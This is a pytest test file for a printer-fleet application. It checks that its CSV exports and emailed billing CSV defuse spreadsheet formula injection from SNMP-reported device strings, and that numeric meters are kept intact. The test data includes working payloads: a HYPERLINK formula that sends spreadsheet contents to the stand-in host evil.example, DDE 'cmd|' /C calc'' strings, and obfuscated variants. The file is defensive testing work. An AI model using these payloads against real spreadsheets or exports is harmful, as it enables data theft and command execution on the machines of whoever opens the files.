"""CSV formula injection: both producers must neutralise, neither may corrupt.

The threat is concrete rather than theoretical. ``printers.model`` /
``hostname`` / ``serial`` / ``brand`` are SNMP strings read off a device on a
client LAN, so whoever controls a printer controls those bytes -- and they are
written verbatim into the monthly billing CSV that gets emailed to the MSP and
opened by hand, and into every operator-facing export. RFC 4180 quoting, which
both producers already had, escapes the payload perfectly and then hands Excel
a live formula.

The other half matters just as much: a rule that quotes anything starting with
``-`` turns ``-5`` into text and breaks the billing import the file exists to
feed. So there are as many assertions here about what must *not* change as
about what must.
"""

from __future__ import annotations

import ast
import csv
import inspect
import io
import textwrap
from decimal import Decimal

import pytest
from fastapi.testclient import TestClient

from central import models as m
from central import reports
from central.api import exports
from central.csv_safe import neutralise_cell, safe_writer
from central.main import app
from central.security import hash_password

# A real, working payload rather than a token: HYPERLINK exfiltrates the
# spreadsheet's own contents to an attacker-controlled host on a single click,
# and needs no macro prompt. The commas and quotes also make it the value RFC
# 4180 quoting handles flawlessly -- which is precisely the point being made.
HOSTILE_MODEL = '=HYPERLINK("http://evil.example/"&A1,"click me")'

# The classic DDE shape, which starts with '+' rather than '='.
HOSTILE_DDE = "+cmd|' /C calc'!A0"

# Leading tab: some importers strip whitespace before deciding whether the cell
# is a formula, so '\t=' is '=' by the time it is evaluated.
HOSTILE_TABBED = "\t=1+1"


# --------------------------------------------------------------------------- #
# The rule itself
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("payload", [
    HOSTILE_MODEL,
    HOSTILE_DDE,
    HOSTILE_TABBED,
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+9)*cmd|' /C calc'!A0",
    "=1+1",
    "\r=1+1",
    "\n=1+1",
    "\uFF1D1+1",   # fullwidth '='
    "\uFF20SUM(A1)",  # fullwidth '@'
])
def test_risky_leads_are_neutralised(payload):
    out = neutralise_cell(payload)
    assert out == "'" + payload
    assert out[0] == "'"


@pytest.mark.parametrize("value", [
    -5, 0, 12345, -1.5, 0.0, Decimal("-5.25"),
    "-5", "+3", "-0", "-1.5e-3", "+1.5E10", "-.5", "-12345.0",
])
def test_numbers_are_never_touched(value):
    """The whole reason the rule is not 'anything starting with -'."""
    assert neutralise_cell(value) == value


@pytest.mark.parametrize("value", [
    "", "Brother", "MFC-L8900CDW", "10.0.0.10", "ACME001",
    "2026-08-03T00:00:00+00:00", "some remaining", "45.0", None,
])
def test_ordinary_values_pass_through_unchanged(value):
    assert neutralise_cell(value) is value


@pytest.mark.parametrize("value", ["-inf", "-nan", "-1_0", "-", "+", "-5 ", "--5"])
def test_near_numbers_are_still_neutralised(value):
    """``float()`` would accept the first three. A spreadsheet does not, so the
    exemption uses a closed-form decimal grammar instead."""
    assert neutralise_cell(value) == "'" + value


def test_only_the_first_character_matters():
    assert neutralise_cell("MFC=L8900") == "MFC=L8900"
    assert neutralise_cell("Site A - Floor 2") == "Site A - Floor 2"


def test_safe_writer_covers_the_header_too():
    buf = io.StringIO()
    w = safe_writer(buf)
    w.writerow(["=evil", "ok"])
    w.writerows([["+dde", -5]])
    assert buf.getvalue() == "'=evil,ok\r\n'+dde,-5\r\n"


def test_safe_writer_output_is_still_rfc4180_parseable():
    """Neutralisation must not cost the quoting that was already correct."""
    buf = io.StringIO()
    safe_writer(buf).writerow([HOSTILE_MODEL, 'has "quotes", commas', "line\nbreak"])
    back = list(csv.reader(io.StringIO(buf.getvalue())))
    assert back == [["'" + HOSTILE_MODEL, 'has "quotes", commas', "line\nbreak"]]


# --------------------------------------------------------------------------- #
# Producer 1: the streamed exports
# --------------------------------------------------------------------------- #
def _seed_hostile_printer(db) -> m.Printer:
    """One approved printer whose SNMP-derived strings are all attacker-chosen,
    plus operator free-text and a negative meter."""
    client = m.Client(name="Acme")
    db.add(client)
    db.flush()
    site = m.Site(client_id=client.id, name="HQ")
    db.add(site)
    db.flush()
    printer = m.Printer(
        client_id=client.id, site_id=site.id, ip="10.0.0.10",
        hostname=HOSTILE_DDE,        # SNMP / DNS
        brand=HOSTILE_TABBED,        # SNMP
        model=HOSTILE_MODEL,         # SNMP
        serial="@SUM(1+9)*cmd|' /C calc'!A0",  # SNMP
        location="-- Basement --",   # operator free-text
        asset_tag="=1+1",            # operator free-text
        status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
        # Negative on purpose: a rolled-over or corrected meter, and the shape
        # the period-delta columns will take. Must survive as a number.
        page_count=-5,
        mono_count=-5,
        color_count=0,
    )
    db.add(printer)
    db.commit()
    return printer


def _admin(db) -> TestClient:
    db.add(m.User(
        username="csvadmin", password_hash=hash_password("pw"), role=m.UserRole.admin,
    ))
    db.commit()
    cli = TestClient(app)
    assert cli.post(
        "/login", data={"username": "csvadmin", "password": "pw"},
        follow_redirects=False,
    ).status_code == 303
    return cli


def _cells(raw: str) -> tuple[list, list]:
    rows = list(csv.reader(io.StringIO(raw)))
    return rows[0], rows[1:]


def test_inventory_export_neutralises_snmp_payloads(db):
    _seed_hostile_printer(db)
    r = _admin(db).get("/api/v1/reports/export/inventory.csv")
    assert r.status_code == 200
    header, rows = _cells(r.text)
    row = rows[0]

    for col in ("model", "hostname", "brand", "serial", "asset_tag"):
        cell = row[header.index(col)]
        assert cell[0] == "'", f"{col} not neutralised: {cell!r}"
        assert cell[0] not in "=+-@\t\r\n"

    # The payload itself survives intact behind the apostrophe -- neutralised,
    # not mangled, so an operator can still read what the device reported.
    assert row[header.index("model")] == "'" + HOSTILE_MODEL

    # The accepted trade, asserted so it is a decision rather than a surprise:
    # a benign string that merely *starts* with a risky character is quoted too.
    # It has to be -- nothing in the bytes distinguishes "-- Basement --" from a
    # payload -- and the numeric exemption is what keeps the cost to free text.
    assert row[header.index("location")] == "'-- Basement --"


def test_inventory_export_does_not_corrupt_legitimate_values(db):
    _seed_hostile_printer(db)
    r = _admin(db).get("/api/v1/reports/export/inventory.csv")
    header, rows = _cells(r.text)
    row = rows[0]

    assert row[header.index("page_count")] == "-5"    # NOT "'-5"
    assert row[header.index("client")] == "Acme"
    assert row[header.index("site")] == "HQ"
    assert row[header.index("ip")] == "10.0.0.10"
    assert row[header.index("status")] == "ok"
    # Every header cell is our own constant and must be emitted verbatim.
    assert header[:3] == ["client", "site", "ip"]


def test_supplies_and_alerts_exports_are_covered_too(db):
    """All three views share ``_csv_response``; assert that rather than assume."""
    printer = _seed_hostile_printer(db)
    db.add(m.Supply(
        printer_id=printer.id, type=m.SupplyType.toner, color="black",
        description="=cmd|' /C calc'!A0", level_pct=-1.0, status_note="-@evil",
    ))
    db.add(m.Alert(
        printer_id=printer.id, type=m.AlertConditionType.supply_below,
        severity=m.EventSeverity.warning, state=m.AlertState.open,
        title="=1+1", detail=HOSTILE_MODEL, dedupe_key="p-supply-black",
    ))
    db.commit()
    http = _admin(db)

    header, rows = _cells(http.get("/api/v1/reports/export/supplies.csv").text)
    row = rows[0]
    assert row[header.index("description")] == "'=cmd|' /C calc'!A0"
    assert row[header.index("status_note")] == "'-@evil"
    assert row[header.index("model")][0] == "'"
    assert row[header.index("level_pct")] == "-1.0"   # negative float untouched

    header, rows = _cells(http.get("/api/v1/reports/export/alerts.csv").text)
    row = rows[0]
    assert row[header.index("title")] == "'=1+1"
    assert row[header.index("detail")] == "'" + HOSTILE_MODEL
    assert row[header.index("model")][0] == "'"


# --------------------------------------------------------------------------- #
# Producer 2: the emailed monthly billing CSV
# --------------------------------------------------------------------------- #
def test_monthly_billing_csv_neutralises_snmp_payloads(db):
    _seed_hostile_printer(db)
    header, rows = _cells(reports.build_monthly_billing_csv(db).decode("utf-8"))
    row = rows[0]

    for col in ("model", "hostname", "brand", "serial", "asset_tag"):
        cell = row[header.index(col)]
        assert cell[0] == "'", f"{col} not neutralised: {cell!r}"
    assert row[header.index("model")] == "'" + HOSTILE_MODEL


def test_monthly_billing_csv_keeps_meters_numeric(db):
    """A billing import parses these. Quoting a negative meter into text is a
    corruption, not a hardening."""
    _seed_hostile_printer(db)
    header, rows = _cells(reports.build_monthly_billing_csv(db).decode("utf-8"))
    row = rows[0]

    assert row[header.index("page_count")] == "-5"
    assert row[header.index("mono_count")] == "-5"
    assert row[header.index("color_count")] == "0"
    assert int(row[header.index("page_count")]) == -5
    assert row[header.index("client")] == "Acme"


def _writer_factories(func) -> set:
    """The writer factories ``func`` actually *calls*, read off its AST.

    Deliberately not a substring search of the source: these functions
    explain in prose why they use ``safe_writer`` and not ``csv.writer``,
    and a grep cannot tell a call from a sentence about one.
    """
    tree = ast.parse(textwrap.dedent(inspect.getsource(func)))
    names = set()
    for node in ast.walk(tree):  # walk covers the nested iter_rows() too
        if not isinstance(node, ast.Call):
            continue
        fn = node.func
        if isinstance(fn, ast.Name):
            names.add(fn.id)
        elif isinstance(fn, ast.Attribute) and isinstance(fn.value, ast.Name):
            names.add(f"{fn.value.id}.{fn.attr}")
    return names


@pytest.mark.parametrize("func", [
    reports.build_monthly_billing_csv,
    exports._csv_response,
])
def test_neutralisation_lives_in_the_writer_not_the_cells(func):
    """The property that must survive future columns: neutralisation is a
    function of the *writer*, not of the cells written today. The billing CSV
    is due to gain period-delta columns; they must be covered without their
    author knowing this file exists. A raw ``csv.writer`` anywhere in either
    producer silently reopens the hole for every column."""
    calls = _writer_factories(func)
    assert "safe_writer" in calls
    assert "csv.writer" not in calls
